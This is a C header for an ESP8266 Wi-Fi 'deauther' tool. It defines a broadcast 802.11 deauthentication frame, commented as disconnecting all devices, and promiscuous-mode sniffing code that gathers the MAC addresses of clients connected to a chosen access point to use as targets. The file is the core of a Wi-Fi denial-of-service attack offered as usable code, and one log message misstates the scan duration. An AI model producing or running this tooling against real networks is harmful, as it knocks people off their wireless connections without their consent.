#ifndef WIFI_DEATHER_H
#define WIFI_DEATHER_H

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <WiFi/connect_to_WiFi.h>

#define SCAN_CYCLE_DURATION 7000 // Duration of client scan in milliseconds

uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target) if you want to send it to a specific device, put its MAC here. Now it disconnects all devices
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap) ap address (the one that sends the packet)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap) target bssid adrress recives the packet
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};
// Структура мак заголовка (Фрейм)
struct wifi_ieee80211_mac_hdr_t {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t addr1[6];  // Адрес назначения
    uint8_t addr2[6];  // Адрес отправителя (клиент)
    uint8_t addr3[6];  // BSSID (адрес точки доступа)
};
struct client_info {
    uint8_t mac[6]; // MAC address of the client
};

// Структура мак заголовка (пакет)
struct wifi_ieee80211_packet_t {
    struct wifi_ieee80211_mac_hdr_t hdr;
};
client_info knownClients[15]; // Array to store known client MAC addresses // Array to store client information

uint8_t targetBSSID[6];

byte scan_clientCount = 0;
byte all_known_clients_count;

byte return_all_known_clients_count() {
    byte count = 0;
    for (byte i = 0; i < 15; i++) {
        if (memcmp(knownClients[i].mac, "\x00\x00\x00\x00\x00\x00", 6) != 0) {
            count++;
        }
    }
    return count;
}

bool isClientKnown(uint8_t *mac) {
    for (byte i = 0; i < 15; i++) { // Перевіряємо всі елементи масиву
        if (memcmp(knownClients[i].mac, mac, 6) == 0) {
            return true;
        }
    }
    return false;
}

void clearClients() {
    for (int i = 0; i < 15; i++) {
        memset(knownClients[i].mac, 0, 6); // Очищаємо MAC-адресу
    }
    scan_clientCount = 0;
}

void printMacAddress(uint8_t *mac) {
    char macStr[18]; // XX:XX:XX:XX:XX:XX + null terminator
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    Serial.println(macStr);
}

void addClient(uint8_t *mac) {
    Serial.print("Checking MAC: ");
    for (byte i = 0; i < 6; i++) {
        Serial.printf("%02X", mac[i]);
        if (i < 5) Serial.print(":");
    }
    Serial.println();

    // Перевіряємо, чи MAC-адреса вже відома
    if (isClientKnown(mac)) {
        Serial.println("MAC already known!");
        return;
    }

    // Шукаємо порожнє місце в масиві
    for (int i = 0; i < 15; i++) {
        if (memcmp(knownClients[i].mac, "\x00\x00\x00\x00\x00\x00", 6) == 0) {
            // Зберігаємо нову MAC-адресу в перше порожнє місце
            memcpy(knownClients[i].mac, mac, 6);
            Serial.print("Client MAC added at index ");
            Serial.print(i);
            Serial.print(": ");
            for (int j = 0; j < 6; j++) {
                Serial.printf("%02X", mac[j]);
                if (j < 5) Serial.print(":");
            }
            Serial.println();
            scan_clientCount++;
            return;
        }
    }

    // Якщо масив заповнений
    Serial.println("Client array full! Cannot add new MAC.");
}

void scanClientsInNetwork(uint8_t *bssid, int channel, byte index) {
    Serial.println("Starting client scan...");
    Serial.print("SSID: ");
    Serial.println(ssid_list_info.SSID_LIST[index]);
    Serial.print("Target BSSID: ");
    printMacAddress(bssid);

    Serial.print("Scanning on channel: ");
    Serial.println(channel);


    Serial.println();

    WiFi.disconnect();
    WiFi.mode(WIFI_STA);
    wifi_set_channel(channel);
    wifi_promiscuous_enable(false);
    memcpy(targetBSSID, bssid, 6);

    scan_clientCount = 0;
    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
        if (len < sizeof(wifi_ieee80211_mac_hdr_t)) return;
        auto *packet = (wifi_ieee80211_packet_t*)(buf + 12);
        auto *hdr = &packet->hdr;
        
        if (memcmp(hdr->addr3, targetBSSID, 6) == 0) {
            if (memcmp(hdr->addr2, targetBSSID, 6) != 0) {
                addClient(hdr->addr2);
            }
        }
    });
    ESP.wdtDisable();
    wifi_promiscuous_enable(true);
    Serial.println("Scanning clients for 10 seconds...");
    delay(SCAN_CYCLE_DURATION);
    wifi_promiscuous_enable(false);
    ESP.wdtEnable(WDTO_8S);
    Serial.println("Client scan finished.");
    
    Serial.printf("Client scan completed. One scan clients found: %d\n", scan_clientCount);
}
#endif // WIFI_DEATHER_H